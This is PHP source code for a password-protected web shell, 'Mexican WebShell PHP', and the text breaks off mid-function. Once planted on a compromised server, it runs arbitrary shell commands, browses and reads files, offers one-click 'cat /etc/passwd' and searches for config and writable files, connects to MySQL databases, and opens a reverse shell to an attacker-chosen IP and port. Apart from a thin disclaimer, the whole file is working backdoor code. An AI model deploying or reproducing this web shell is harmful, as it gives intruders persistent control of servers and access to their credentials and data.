<?php
/**
 * Created by @codersoul.
 * Greetz: @ZoSemU,@z3r0k3y,@m4ku4z,@HackingMexico,@LastDragonMX
 * Users: codersoul
 * Date: 06/03/13
 * Time: 16:14
 * Version: 1.0 beta
 * This tool may be used for legal purposes only.  Users take full responsibility
 * for any actions performed using this tool.  The author accepts no liability
 * for damage caused by this tool.  If these terms are not acceptable to you, then
 * do not use this tool.
 
 * In all other respects the GPL version 2 applies:
 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */
 
 
error_reporting(E_ALL ^ E_NOTICE);
set_time_limit (0);
ini_set("memory_limit","-1");
date_default_timezone_set("America/Mexico_City");
 
session_start();
 
 
class WebShell{
    var $pass="1337";
 
    function __construct(){
 
        if($_SESSION['logged'] != TRUE && $_POST['cmd']!='login' && empty($_POST['pass']))
            $this->buildPageLogin();
        else{
 
            switch($_POST['cmd']){
                case 'browser':
 
                    $browserTools=new BrowserTools();
                    switch($_POST['method']){
                        case 'show':
                            $this->buildPageStructure($browserTools->main($_POST['item'],false));
                        break;
                        case 'execute':
                            $this->buildPageStructure($browserTools->main($_POST['item']));
                            break;
 
                        default:
                            $this->buildPageStructure($browserTools->main('.'));
                            break;
                    }
                    break;
                case 'logout':
                    $this->logout();
                    break;
                case 'remove':
                    $this->remove();
                    break;
                case 'php':
                    $phpTools=new PhpTools();
                    switch($_POST['method']){
                        case 'execute':
                            $util=New Util();
                            $run=$util->execute($_POST['item']);
                            foreach($run as $row){
                                $resp[]=htmlentities(wordwrap($row,100,' ',TRUE),ENT_QUOTES);
                            }
                            $this->buildPageStructure($phpTools->main($resp));
                            break;
                        default:
                            $this->buildPageStructure($phpTools->main(''));
                            break;
                    }
                    break;
                case 'mysql':
                    $mySql=new MySQLTools();
 
                    switch($_POST['method']){
                        case 'connect':
                            if(!empty($_POST['userdb'])&&!empty($_POST['serverdb'])&&!empty($_POST['portdb'])){
                                $_SESSION['userdb']=$_POST['userdb'];
                                $_SESSION['passdb']=$_POST['passdb'];
                                $_SESSION['serverdb']=$_POST['serverdb'];
                                $_SESSION['portdb']=$_POST['portdb'];
                                if($mySql->connect()){
                                    $_SESSION['connected']=TRUE;
                                    $this->buildPageStructure($mySql->main());
                                }
                                else{
                                    $error="
                                       <div class='alert'>
                                           <strong>Warning!</strong> ".$_SESSION['linkdb']->connect_error."
                                       </div>
                                   ";
                                    $this->buildPageStructure($mySql->main($error));
                                }
 
                            }
                            break;
                        case 'selectdb':
                            if(!empty($_POST['item'])){
 
                                $_SESSION['db']=$_POST['item'];
 
                                if($mySql->selectDb($_POST['item'])){
                                    $this->buildPageStructure($mySql->main());
                                }else{
                                    $error="
                                       <div class='alert'>
                                           <strong>Warning!</strong> Can't select the Database. Please try again.
                                       </div>
                                   ";
                                    $this->buildPageStructure($mySql->main($error));
                                }
                            }
                            break;
 
                        case 'query':
                            if(!empty($_POST['item'])){
                                if($result=$mySql->execute($_POST['item'])){
                                    $_SESSION['query']=$result;
                                    $this->buildPageStructure($mySql->main());
                                }
                                else{
                                    $error="
                                       <div class='alert'>
                                           <strong>Warning!</strong> ".$_SESSION['linkdb']->error."
                                       </div>
                                   ";
                                    $this->buildPageStructure($mySql->main($error));
                                }
                            }
                            break;
 
                        case 'logout':
                            $_SESSION['connected']=NULL;
                            $_SESSION['userdb']=NULL;
                            $_SESSION['passdb']=NULL;
                            $_SESSION['serverdb']=NULL;
                            $_SESSION['portdb']=NULL;
                            $_SESSION['db']=NULL;
                            $_SESSION['linkdb']=NULL;
 
                            $this->buildPageStructure($mySql->main());
                            break;
                        default:
                            $this->buildPageStructure($mySql->main());
                            break;
                    }
                    break;
                case 'reverse':
                    $reverseTools=new ReverseTools();
                    switch($_POST['method']){
                        case 'connect':
 
                            if( isset($_POST['port']) && isset($_POST['ip']) && $_POST['port'] != "" && $_POST['ip'] != ""){
 
                                $result="";
 
                                $ip = $_POST['ip'];
                                $port=$_POST['port'];
                                $chunk_size = 1400;
                                $write_a = null;
                                $error_a = null;
                                $shell = 'uname -a; /bin/sh -i';
 
                                $debug = 0;
 
                                chdir("/");
                                umask(0);
 
                                $sock = fsockopen($ip, $port, $errno, $errstr, 30);
                                if (!$sock) {
                                    echo "$errstr ($errno)";
                                    exit(1);
                                }
 
 
                                $descriptorspec = array(
                                    0 => array("pipe", "r"),
                                    1 => array("pipe", "w"),
                                    2 => array("pipe", "w")
                                );
 
                                $process = proc_open($shell, $descriptorspec, $pipes);
 
                                if (!is_resource($process)) {
                                    echo "ERROR: Can't spawn shell";
                                    exit(1);
                                }
 
                                stream_set_blocking($pipes[0], 0);
                                stream_set_blocking($pipes[1], 0);
                                stream_set_blocking($pipes[2], 0);
                                stream_set_blocking($sock, 0);
 
                                $result .= "Successfully opened reverse shell to $ip:$port";
 
                                while (1) {
 
                                    if (feof($sock)) {
                                        $result.="ERROR: Shell connection terminated";
                                        break;
                                    }
 
 
                                    if (feof($pipes[1])) {
                                        $result.="ERROR: Shell process terminated";
                                        break;
                                    }
 
                                    $read_a = array($sock, $pipes[1], $pipes[2]);
                                    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
                                    if (in_array($sock, $read_a)) {
                                        if ($debug) printit("SOCK READ");
                                        $input = fread($sock, $chunk_size);
                                        if ($debug) printit("SOCK: $input");
                                        fwrite($pipes[0], $input);
                                    }
 
                                    if (in_array($pipes[1], $read_a)) {
                                        if ($debug) printit("STDOUT READ");
                                        $input = fread($pipes[1], $chunk_size);
                                        if ($debug) printit("STDOUT: $input");
                                        fwrite($sock, $input);
                                    }
 
                                    if (in_array($pipes[2], $read_a)) {
                                        if ($debug) printit("STDERR READ");
                                        $input = fread($pipes[2], $chunk_size);
                                        if ($debug) printit("STDERR: $input");
                                        fwrite($sock, $input);
                                    }
                                }
 
                                fclose($sock);
                                fclose($pipes[0]);
                                fclose($pipes[1]);
                                fclose($pipes[2]);
                                proc_close($process);
                            }
                            $this->buildPageStructure($reverseTools->main());
                            break;
                        default:
                            $this->buildPageStructure($reverseTools->main(''));
                            break;
                    }
                    break;
                case 'login':
                    if(isset($_POST['pass'])&&!empty($_POST['pass'])){
                        $this->login($_POST['pass']);
                    }
                    break;
                default:
                    $info=new Info();
                    $this->buildPageStructure($info->main());
                    break;
 
            }
        }
 
    }
 
    function buildPageLogin($error=NULL){
        $this->buildHeader();
        $this->buildLogin($error);
        $this->buildFooter();
    }
 
    function buildPageStructure($body=NULL){
        $this->buildHeader();
        $this->buildMenu();
        $this->buildBody($body);
        $this->buildFooter();
    }
 
    function buildHeader(){
        $structure= "<html>
               <head>
                   <title>WebShell</title>
                   <link href='http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css' rel='stylesheet'>
                   <style type='text/css'>
                       body,html{ height:100%;} .footer{ padding-top:8px; padding-right:10px; text-align:right; height:30px; bottom:0; right:0; left:0; display:block; position:fixed;} .container{ min-height:100%; width:100%;}
                   </style>
                   <script src='http://code.jquery.com/jquery-1.9.1.min.js'></script>
                   <script src='http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js'></script>
                   <script type='text/javascript'>
                                                function _asubmit(id){
                                                                var form = document.getElementById(id);
                                                                form.submit();
                                                }
 
                                                function elementsee(id, type){
 
                                                        if(type==1){
                                                                document.getElementById(id).style.display='none';
                                                        }else{
                                                                document.getElementById(id).style.display='block';
                                                        }
                                                }
 
                       function doFormPost(cmd,method,item){
 
                           var newForm=document.createElement('FORM');
                           document.body.appendChild(newForm);
                           newForm.method = 'POST';
 
                           var newElement = document.createElement('INPUT');
 
                           newForm.appendChild(newElement);
                           newElement.type='hidden';
                           newElement.name='cmd';
                           newElement.value = cmd;
 
                           var newElement = document.createElement('INPUT');
 
                           newForm.appendChild(newElement);
                           newElement.type='hidden';
                           newElement.name='method';
                           newElement.value = method;
 
                           var newElement = document.createElement('INPUT');
 
                           newForm.appendChild(newElement);
                           newElement.type='hidden';
                           newElement.name='item';
                           newElement.value = item;
 
                           newForm.action= '".$_SERVER['PHP_SELF']."';
                           newForm.submit();
                       }
                   </script>
               </head>
               <body>
                   <div class='container'>
       ";
 
        echo $structure;
    }
 
    function buildLogin($error){
        $structure= "
 
                           <div style='background-color: #EEE; padding:10px; margin:0 auto; width:300px; margin-top: 10%;'>
                               <form class='well' method='POST'>
                                   <label>Mexican WebShell PHP</label>
                                   <input name='pass' type='password' class='span3' placeholder='Password' style='height:30px;'>
                                   <input type='hidden' name='cmd' value='login'>
                                   <button type='submit' class='btn'>Submit</button>
                               </form>
                           </div>
 
       ";
        $structure.=$error;
        echo $structure;
    }
 
    function buildMenu(){
        $structure= "
                       <div class='navbar navbar-fixed-top'>
                           <div class='navbar-inner'>
                               <div class='container'>
                                   <a class='btn btn-navbar' data-toggle='collapse' data-target='.nav-collapse'>
                                       <span class='icon-bar'></span>
                                       <span class='icon-bar'></span>
                                       <span class='icon-bar'></span>
                                   </a>
                                   <a class='brand' href='#'>WebShell</a>
                                   <div class='nav-collapse'>
                                       <ul class='nav'>
                                           <li><a href='#' onClick='doFormPost();'><i class='icon-home'></i> Main</a></li>
                                           <li><a href='#' onClick='doFormPost(\"browser\");'><i class='icon-search'></i> Browser Files</a></li>
                                           <li><a href='#' onClick='doFormPost(\"php\");'><i class='icon-fire'></i> Php Tools</a></li>
                                           <li><a href='#' onClick='doFormPost(\"mysql\");'><i class='icon-th-list'></i> Mysql Tools</a></li>
                                           <li><a href='#' onClick='doFormPost(\"reverse\");'><i class='icon-resize-vertical'></i> Reverse Shell</a></li>
                                           <li><a href='#' onclick='Javascript:if(confirm(\"Remove Mexican WebShell ? \")){doFormPost(\"remove\");}'><i class='icon-trash'></i> Self Remove</a></li>
                                           <li><a href='#' onClick='doFormPost(\"logout\");'><i class='icon-off'></i> Logout</a></li>
                                       </ul>
                                   </div>
                               </div>
                           </div>
                       </div>
       ";
 
        echo $structure;
    }
 
    function buildBody($body){
        $structure=$body;
        echo $structure;
    }
 
    function buildFooter(){
        $structure="
                   </div>
                   <div class='footer' style='color:#FFF; background-color:#2C2C2C'>Mexican WebShell PHP. Powered by <a href='https://twitter.com/#!/codersoul' target='_blank'>@codersoul</a></div>
               </body>
           </html>
       ";
        echo $structure;
    }
 
    function login($pass){
        if($pass==$this->pass){
            $_SESSION['logged']=TRUE;
            $info=new Info();
            $this->buildPageStructure($info->main());
        }
        else{
            $error="
               <div class='alert' style='width:270px; margin:20px auto;'>
                   <strong>Warning!</strong> Password is not valid. Please try again.
               </div>
           ";
            $this->buildPageLogin($error);
        }
    }
 
    function logout(){
        session_destroy();
        header('Location: '.$_SERVER['PHP_SELF']);
    }
 
    function remove(){
        session_destroy();
        if(unlink($_SERVER['PHP_SELF'])){
            echo "You can't remove this file.";
            exit;
        }
        header('Location: '.$_SERVER['PHP_SELF']);
    }
 
}
 
 
 
 
 
class PhpTools{
 
    function main($run){
        $util=New Util();
        $body='
           <div class="container-fluid" style="margin:60px;">
               <div class="row-fluid">
                   <div class="span3">
                       <div class="well sidebar-nav" style="overflow-x:auto;">
                           <ul class="nav nav-list">
                               <li class="nav-header">PHP Tools</li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'uname -a\');">uname -a</a></li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'ps aux\');">ps aux</a></li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'cat /etc/passwd\');">cat /etc/passwd</a></li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'df -h\');">df -h</a></li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'mount\');">mount</a></li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'find '.$util->dirBack($_SERVER['PHP_SELF']).' -type f -name config*php\');">find '.$util->dirBack($_SERVER['PHP_SELF']).' -type f -name config*php</a></li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'find '.$util->dirBack($_SERVER['PHP_SELF']).' -type d -writable\');">find '.$util->dirBack($_SERVER['PHP_SELF']).' -type d -writable</a></li>
                               <li><a href="#" onclick="doFormPost(\'php\',\'execute\',\'find '.$util->dirBack($_SERVER['PHP_SELF']).' -type f -writable\');">find '.$util->dirBack($_SERVER['PHP_SELF']).' -type f -writable</a></li>
                           </ul>
                       </div>
                   </div>
                   <div class="span9">
                       <div class="well">
                           <h2>Php Execute </h2>
                           <form class="well" method="POST">
                               <textarea name="item" style="width:100%; height:100px;" class="input-xlarge">';
 
        if($_POST['method']=='execute')
            $body.=htmlentities($_POST['item'],ENT_QUOTES);
 
        $body.='</textarea>
                               <input type="hidden" name="cmd" value="php">
                               <input type="hidden" name="method" value="execute">
                               <p style="text-align: right;"><button type="submit" class="btn btn-success">Run &raquo;</button></p>
 
                           </form>
                           <h2>Response</h2>
                           <div class="well" style="height: 300px; overflow-x:auto; overflow-y:auto;">
                               <pre>';
        if(is_array($run)){
            foreach($run as $row)
                $body.=$row."<br>";
        }
        $body.='</pre>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       ';
        return $body;
    }
 
}
 
class ReverseTools{
 
    function main(){
        $body='
           <div class="container-fluid" style="margin:60px;">
               <div class="row-fluid">
                   <div class="span12" style="margin:0 auto;">
                       <div class="well" style="width:300px; margin:0 auto;">
                           <h2>Reverse shell </h2>
                           <form class="well" method="POST">
                               <input name="ip" type="text" class="span12" placeholder="IP" value="127.0.0.1" style="height:30px;">
                               <input name="port" type="text" class="span12" placeholder="Port" value="31337" style="height:30px;">
                               <input type="hidden" name="cmd" value="reverse">
                               <input type="hidden" name="method" value="connect">
                               <p style="text-align: right;"><button type="submit" class="btn btn-success">Reverse Connect &raquo;</button></p>
                           </form>
                           Listening with NetCat: nc -v -n -l 31337
                       </div>
                   </div>
               </div>
           </div>
       ';
        return $body;
    }
 
}
 
class BrowserTools{
 
    function getLinkDir($dir,$complete=true){
 
        $path="";
 
        if($complete){
 
            $dirs = explode("/",$dir);
 
            for($i=0;$i<count($dirs);$i++){
                if($dirs[$i]){
                    $path.='<a href="#" onclick="doFormPost(\'browser\',\'execute\',\''.substr($dir,0,strpos($dir,$dirs[$i])+strlen($dirs[$i])).'\');">'.$dirs[$i].'/</a>';
                }
                else{
                    if($i==0)
                        $path.='<a href="#" onclick="doFormPost(\'browser\',\'execute\',\'/\');">/</a>';
                }
 
            }
        }
        else{
            $path.='<a href="#" onclick="doFormPost(\'browser\',\'execute\',\''.$dir.'\');">'.$dir.'</a>';
        }
        return $path;
    }
 
    function getFixedFormat($result,$full_dir){
        $util = new Util();
        if(!empty($result)){
 
            $structure='
               <table class="table table-bordered table-striped" style="font-size:12px;">
                   <thead>
                       <tr>
                           <th>File name</th>
                           <th>Permissions</th>
                           <th>Owner</th>
                           <th>Group</th>
                           <th>Size</th>
                           <th>Last modified</th>
                       </tr>
                   </thead>
                   <tbody>
           ';
 
            for($i=1;$i<count($result);$i++){
                $structure.='<tr>';
 
                $result_array = explode(" ",preg_replace('[\s+]',' ', $result[$i]));
 
                $structure.='<td>';
                    if($result_array[0][0]=='d')
                        $structure.='<img title="Dir" src="data:image/gif;base64,'.$util->images('directory').'" />  <a href="#" onclick="doFormPost(\'browser\',\'execute\',\''.$full_dir.'/'.$result_array[8].'\');">'.htmlentities(wordwrap($result_array[8],50," ",TRUE),ENT_QUOTES).'</a>';
                    else
                        $structure.='<img title="Dir" src="data:image/gif;base64,'.$util->images('file').'" /> <a href="#" onclick="doFormPost(\'browser\',\'show\',\''.$full_dir.'/'.$result_array[8].'\');">'.htmlentities(wordwrap($result_array[8],50," ",TRUE),ENT_QUOTES).'</a>';
                $structure.='</td>';
                $structure.='<td>'.htmlentities(wordwrap($result_array[0],50," ",TRUE),ENT_QUOTES).'</td>';
                $structure.='<td>'.htmlentities(wordwrap($result_array[2],50," ",TRUE),ENT_QUOTES).'</td>';
                $structure.='<td>'.htmlentities(wordwrap($result_array[3],50," ",TRUE),ENT_QUOTES).'</td>';
                $structure.='<td>'.htmlentities(wordwrap($result_array[4],50," ",TRUE),ENT_QUOTES).'</td>';
                $structure.='<td>'.htmlentities(wordwrap($result_array[5],50," ",TRUE),ENT_QUOTES).' '.htmlentities(wordwrap($result_array[6],50," ",TRUE),ENT_QUOTES).' '.htmlentities(wordwrap($result_array[7],50," ",TRUE),ENT_QUOTES).'</td>';
 
                $structure.='</tr>';
            }
 
            $structure.='
                   </tbody>
               </table>
           ';
 
 
            return $structure;
        }
    }
 
 
    function main($item,$is_dir=true){
 
        $util = new Util();
 
        if($is_dir){
            $_SESSION['dir']=$item;
            $modal = "";
        }
        else{
            $file = $item;
            $item = $_SESSION['dir'];
            $file_content = $util->execute("cat ".$file);
 
            $modal = '
               <div id="browserModal" class="modal hide fade" tabindex="-1" style="" role="dialog" aria-labelledby="browserModalLabel" aria-hidden="true">
                   <div class="modal-header">
                       <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                       <h3 id="myModalLabel">View file</h3>
                   </div>
                   <div class="modal-body">
                       <p>File: '.$file.'</p>
                       <div class="well" style="overflow:auto; height:300px;">
                           <pre>';
 
            if(is_array($file_content)){
                foreach($file_content as $row)
                    $modal.=htmlentities($row,ENT_QUOTES)."<br>";
            }
 
            $modal.='
                           </pre>
                       </div>
                   </div>
                   <div class="modal-footer">
                       <button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
                   </div>
               </div>
               <script type="text/javascript">$("#browserModal").modal("show")</script>
               ';
 
 
        }
        if($item=='.'){
            $full_dir=getcwd();
        }
        else{
            $full_dir=$item;
        }
 
        $body=$modal.'
           <div class="container-fluid" style="margin:60px;">
               <div class="row-fluid">
                   <div class="span12" style="margin:0 auto;">
                       <div class="well">
                           <h2>Browser Files</h2>
                           <div style="margin:10px 0;">Shell path: '.$this->getLinkDir(getcwd(),false).'</div>
                           <div style="margin:10px 0;">Path: '.$this->getLinkDir($full_dir).'</div>
                           ';
 
        $body.=$this->getFixedFormat($util->execute("ls -lhA ".$full_dir),$full_dir);
 
        $body.='
                       </div>
                   </div>
               </div>
           </div>
       ';
        return $body;
    }
 
}
 
class MySqlLib{
 
    function connect(){
        $link=@new mysqli($_SESSION['serverdb'],$_SESSION['userdb'],$_SESSION['passdb'],$_SESSION['db'],$_SESSION['portdb']);
 
        $_SESSION['linkdb']=$link;
 
        if ($link->connect_errno)
            return false;
        return true;
    }
 
    function disconnect(){
        $_SESSION['linkdb']->close();
    }
 
    function selectDb(){
        if($_SESSION['connected']==TRUE){
            $this->connect();
            if(!mysqli_select_db($_SESSION['linkdb'],$_SESSION['db'])){
                return false;
            }
            $this->disconnect();
            return true;
        }
        return false;
    }
 
    function execute($query){
        if($_SESSION['connected']==TRUE){
            $this->connect();
            if(!$result=@mysqli_query($_SESSION['linkdb'],$query))
                return false;
            $this->disconnect();
            return $result;
        }
        return false;
    }
 
    function getData($query){
        if($_SESSION['connected']==TRUE){
            if(!$result = $this->execute($query))
                return false;
            while($row = mysqli_fetch_object($result)){
                $data[] = $row;
            }
 
            return $data;
        }
        return false;
    }
}
 
class MySqlTools extends MySqlLib{
    function __construct(){
 
    }
 
    function getConnection(){
        if($_SESSION['connected']==TRUE){
            $structure="
               User: ".$_SESSION['userdb']."<br>
               Server: ".$_SESSION['serverdb']."<br>
               Port: ".$_SESSION['portdb']."<br>
              <a href='#' onClick='doFormPost(\"mysql\",\"logout\");'>Logout</a>
 
           ";
            return $structure;
        }
        else{
            $structure='
               <form method="POST">
                   <input name="userdb" type="text" class="span12" placeholder="User DB" style="height:30px;">
                   <input name="passdb" type="text" class="span12" placeholder="Pass DB" style="height:30px;">
                   <input name="serverdb" type="text" class="span12" placeholder="Server DB" value="127.0.0.1" style="height:30px;">
                   <input name="portdb" type="text" class="span12" placeholder="Port" value="3306" style="height:30px;">
                   <input type="hidden" name="cmd" value="mysql">
                   <input type="hidden" name="method" value="connect">
                   <button type="submit" class="btn btn-success">Connect</button>
               </form>
           ';
            return $structure;
        }
    }
 
    function getTables(){
        if($_SESSION['connected']==TRUE){
            return $this->getData("select table_name from information_schema.tables where table_schema='".$_SESSION['db']."'");
        }
        return false;
    }
 
    function getDatabases(){
        $structure=NULL;
        $tables=NULL;
 
        if($_SESSION['connected']==TRUE){
            $result=$this->getData("select schema_name from information_schema.schemata");
 
            foreach($result as $row){
                $structure.="<li ";
 
                if($_SESSION['db']==$row->schema_name){
 
                    $structure.="class='active'";
                    $tables=$this->getTables();
                }
 
                $structure.="><a href='#' onclick='doFormPost(\"mysql\",\"selectdb\",\"".$row->schema_name."\");'>".$row->schema_name."</a></li>";
                if(!empty($tables)){
                    $structure.="
                       <li>
                           <ul class='nav nav-list'>
                               <li class='nav-header'>Tables</li>
                   ";
 
                    foreach($tables as $row){
 
                        $row=each($row);
 
                        $structure.="<li><a href='#' onclick='doFormPost(\"mysql\",\"query\",\"select column_name,is_nullable,column_type,privileges,column_comment from information_schema.columns where table_schema=\\\"".$_SESSION['db']."\\\" and table_name=\\\"".$row['value']."\\\"\");'>".$row['value']."</a></li>";
                    }
                    $structure.="
                           </ul>
                       </li>
                   ";
                    $tables=NULL;
                }
            }
        }
        return $structure;
    }
 
    function getQueryResult(){
        if(!empty($_SESSION['query'])){
 
            $structure='
               <table class="table table-bordered table-striped" style="font-size:12px;">
                   <thead>
                       <tr>
 
           ';
 
            while($row= $_SESSION['query']->fetch_field())
                $structure.='<th>'.htmlentities($row->name,ENT_QUOTES).'</th>';
 
            $structure.='
                       </tr>
                   </thead>
                   <tbody>
           ';
 
            while($result = mysqli_fetch_object($_SESSION['query'])){
                $structure.='
                   <tr>
               ';
                foreach($result as $row){
                    $structure.='<td>'.htmlentities($row,ENT_QUOTES).'</td>';
                }
 
                $structure.='
                   </tr>
               ';
            }
 
            $structure.='
                   </tbody>
               </table>
           ';
 
            $_SESSION['query']=NULL;
            return $structure;
        }
    }
 
    function main($error=NULL){
        $body='
           <div class="container-fluid" style="margin:60px;">
               <div class="row-fluid">
                   <div class="span3">
                       <div class="well sidebar-nav" style="overflow-x:auto;">
                           <ul class="nav nav-list">
                               <li class="nav-header">Connection</li>
                               <li>
                                   '.$this->getConnection().'
                               </li>
                               <li class="nav-header">Databases</li>
                               '.$this->getDatabases().'
 
                               <li class="nav-header">Tools</li>
                               <li><a href="#" onclick="doFormPost(\'mysql\',\'query\',\'show full processlist\');">Show Process</a></li>
                           </ul>
                       </div>
                   </div>
                   <div class="span9">
                       <div class="well">
                           '.$error.'
                           <h2>Execute Query</h2>
                           <form class="well" method="POST">
                               <textarea name="item" style="width:100%; height:150px;" class="input-xlarge"';
 
        if(empty($_SESSION['db']))
            $body.=" disabled title='Login first and select a Database' ";
 
        $body.='>';
        if($_POST['method']=='query')
            $body.=htmlentities($_POST['item'],ENT_QUOTES);
        $body.='</textarea>
                               <input type="hidden" name="cmd" value="mysql">
                               <input type="hidden" name="method" value="query">
                               <p style="text-align: right;"><button type="submit" class="btn btn-success">Run &raquo;</button></p>
 
                           </form>
                           <h2>Response</h2>
                           <div class="well" style="height: 300px; overflow-x:auto; overflow-y:auto;">
                           '.$this->getQueryResult().'
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       ';
        return $body;
    }
 
}
 
class Info{
 
    function __construct(){
 
    }
 
    function getFixedFormat($data,$cut,$split){
        $body='
           <table class="table table-bordered table-striped" style="font-size: 10px;">
               <thead>
                   <tr>
       ';
        for($i=0; $i<count($data[0]); $i++){
            if($i==$cut){
                $str=NULL;
                for( ; $i<count($data[0]) ; $i++){
                    $str.=htmlentities(wordwrap($data[0][$i],$split," ",TRUE),ENT_QUOTES)." ";
                }
                $body.="<th>".$str."</th>";
            }
            else{
                $body.="<th>".(htmlentities(wordwrap($data[0][$i],$split," ",TRUE),ENT_QUOTES))."</th>";
            }
        }
        $body.='
                   </tr>
               </thead>
               <tbody>
       ';
 
        for($i=1;$i<count($data);$i++){
            $body.="<tr>";
 
            for($j=0; $j<count($data[$i]); $j++){
                if($j==$cut){
 
                    $str=NULL;
                    for(; $j<count($data[$i]); $j++){
                        $str.=htmlentities(wordwrap($data[$i][$j],$split," ",TRUE),ENT_QUOTES)." ";                                            }
                    $body.="<td>".$str."</td>";
                    //echo $j." :: ".$str."\n";
 
 
                }
                else{
                    $body.="<td>".htmlentities(wordwrap($data[$i][$j],$split," ",TRUE),ENT_QUOTES)."</td>";
                }
            }
 
            $body.="</tr>";
        }
 
        $body.='
               </tbody>
           </table>
       ';
        //exit;
        return $body;
    }
 
    function main(){
        $util=New Util();
        $uptime=$util->execute('cat /proc/uptime');
        $uptime=preg_split("/[\s]+/",$uptime[0]);
        $uptime=$uptime[0];
 
        $uptime=(int)($uptime/86400)." day(s) ".(int)($uptime/3600)." hour(s) ".floor(($uptime/60)%60)." minute(s) ".floor($uptime%60)." second(s)";
        $body='
           <div class="container-fluid" style="margin:60px;">
               <div class="row-fluid show-grid">
                   <div class="span6">
                       <div class="well"  style="font-size:14px; height:450px; overflow-x:auto; overflow-y:auto;">
                           <h2>Server Information</h2>
                           <br>Operating System: <span style="color:#08C;">'.php_uname('s').' '.php_uname('r').'</span><br><br>
                           Platform: <span style="color:#08C;">'.php_uname('m').'</span><br><br>
                           Up Time: <span style="color:#08C;">'.$uptime.'</span><br><br>
                           Name: <span style="color:#08C;">'.php_uname('n').'</span><br><br>
                           Document Root: <span style="color:#08C;">'.$_SERVER['DOCUMENT_ROOT'].'</span><br><br>
                           Server Admin: <span style="color:#08C;">'.$_SERVER['SERVER_ADMIN'].'</span><br><br>
                           Id:<br><span style="color:#08C;">'.(implode('',$util->execute('id'))).'</span><br><br>
                           Uname -a:<br><span style="color:#08C;">'.(implode('',$util->execute('uname -a'))).'</span><br><br>
                       </div>
                   </div>
                   <div class="span6">
                       <div class="well" style="height:450px; overflow-x:auto; overflow-y:auto;">
                           <h2>Disk</h2>
                           <span style="color:#08C;">'.($this->getFixedFormat($util->fixFormat($util->execute('df -h')),5,50)).'</span>
                       </div>
                   </div>
               </div>
               <div class="row-fluid show-grid">
                   <div class="span12">
                       <h2>Running Process</h2>
                       <div class="well" style="height:450px; overflow-x:auto; overflow-y:auto;">
                           <span style="color:#08C; ">'.($this->getFixedFormat($util->fixFormat($util->execute('ps aux')),10,20)).'</span><br><br>
                       </div>
                   </div>
               </div>
           </div>
       ';
 
        return $body;
    }
}
 
class Util{
 
    function __construct(){
 
    }
 
    function execute($cmd){
        if (!empty($cmd)){
 
            if(is_callable("exec")) {
                exec($cmd,$response);
                //$result = join("\n",$result);
                return $response;
            }
 
            if(is_callable("shell_exec")) {
                $response = shell_exec($cmd);
                return $response;
            }
 
 
 
            if (is_callable("system")) {
                @ob_start();
                system($cmd);
                $response = @ob_get_contents();
                @ob_end_clean();
                return $response;
            }
            if (is_callable("passthru")) {
                @ob_start();
                passthru($cmd);
                $response = @ob_get_contents();
                @ob_end_clean();
                return $response;
            }
            return false;
        }
    }
 
    function fixFormat($data){
        foreach($data as $item){
            $ps[]=explode(" ", preg_replace('/\s\s+/', ' ', trim($item)));
        }
        return $ps;
    }
 
    function dirBack($str){
        $str = preg_replace('/\/\/+/', '/', trim($str));
 
        for($i=1,$dir=NULL;$i<strlen($str);$i++){
            if($str[$i]=='/')
                $dir.='../';
        }
        return $dir?$dir:'.';
    }
 
    function images($img){
        switch($img){
            case 'directory':
                return "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLxZO7ihRBFIa/6u0ZW7GHBUV0UQQTZzd3QdhMQxOfwMRXEANBMNQX0MzAzFAwEzHwARbNFDdwEd31Mj3X7a6uOr9BtzNjYjKBJ6nicP7v3KqcJFaxhBVtZUAK8OHlld2st7Xl3DJPVONP+zEUV4HqL5UDYHr5xvuQAjgl/Qs7TzvOOVAjxjlC+ePSwe6DfbVegLVuT4r14eTr6zvA8xSAoBLzx6pvj4l+DZIezuVkG9fY2H7YRQIMZIBwycmzH1/s3F8AapfIPNF3kQk7+kw9PWBy+IZOdg5Ug3mkAATy/t0usovzGeCUWTjCz0B+Sj0ekfdvkZ3abBv+U4GaCtJ1iEm6ANQJ6fEzrG/engcKw/wXQvEKxSEKQxRGKE7Izt+DSiwBJMUSm71rguMYhQKrBygOIRStf4TiFFRBvbRGKiQLWP29yRSHKBTtfdBmHs0BUpgvtgF4yRFR+NUKi0XZcYjCeCG2smkzLAHkbRBmP0/Uk26O5YnUActBp1GsAI+S5nRJJJal5K1aAMrq0d6Tm9uI6zjyf75dAe6tx/SsWeD//o2/Ab6IH3/h25pOAAAAAElFTkSuQmCC";
            break;
 
            case 'file':
